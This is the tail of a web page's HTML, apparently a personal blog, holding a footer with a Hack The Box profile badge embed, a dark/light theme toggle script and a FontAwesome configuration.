    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
